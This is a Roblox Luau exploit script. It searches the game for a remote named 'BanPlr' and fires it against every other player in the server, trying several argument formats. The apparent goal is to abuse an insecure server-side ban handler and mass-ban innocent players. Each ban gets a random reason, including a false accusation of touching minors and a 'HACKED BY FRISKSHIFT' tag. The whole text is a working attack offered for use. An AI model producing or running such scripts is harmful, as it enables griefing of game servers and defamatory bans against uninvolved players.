local banName = "BanPlr"
local aMethod = 1
local isFunction = false

function getType(istan:Instance, type_name:string, name:string):table
    local type_tbl = {}
    for _, even in istan:GetDescendants() do
        if even:IsA(type_name) then
            if name == nil then
                table.insert(type_tbl, even)
            elseif even.Name == name then
                table.insert(type_tbl, even)
            end
        end
    end
    return type_tbl
end

local PS = game:GetService("Players")
local reasons = {"Scamming", "Farting Owner", "Exploitng", "Bypassing Chat", "Harassment", "Bullying someone", "Inappropriate Avator / Name", "Touching minors", "HACKED BY FRISKSHIFT", "FRISKSHIFT IS BACK"}

local function parseArgs(p, reason)
    local bantable = {}
    if aMethod == 1 then
        bantable = {
            [1] = {
                [1] = p,
                [2] = p,
                [3] = reason
            }
        }
    elseif aMethod == 2 then
        bantable = {
            [1] = {
                [1] = p.UserId,
                [2] = p.UserId,
                [3] = reason
            }
        }
    elseif aMethod == 3 then
        bantable = {
            [1] = {
                [1] = p.Name,
                [2] = p.Name,
                [3] = reason
            }
        }
    elseif aMethod == 4 then
        bantable = {
            [1] = p.UserId,
            [2] = '',
            [3] = '',
            [4] = '',
            [5] = '',
        }
    elseif aMethod == 5 then
        bantable = {
            [1] = p.Name,
            [2] = '',
            [3] = '',
            [4] = '',
            [5] = '',
        }
    else
        bantable = {
            [1] = p,
            [2] = '',
            [3] = '',
            [4] = '',
            [5] = '',
        }
    end
    return bantable
end
local function doRemote(tbl:table)
    for _, remote in pairs(getType(game, isFunction and "RemoteFunction" or "RemoteEvent", banName)) do
        if isFunction then
            remote:InvokeServer(unpack(tbl))
        else
            remote:FireServer(unpack(tbl))
        end
    end
end

for _, p in PS:GetPlayers() do
    if p == PS.LocalPlayer then continue end
    doRemote(parseArgs(p, reasons[math.random(0, #reasons)]))
end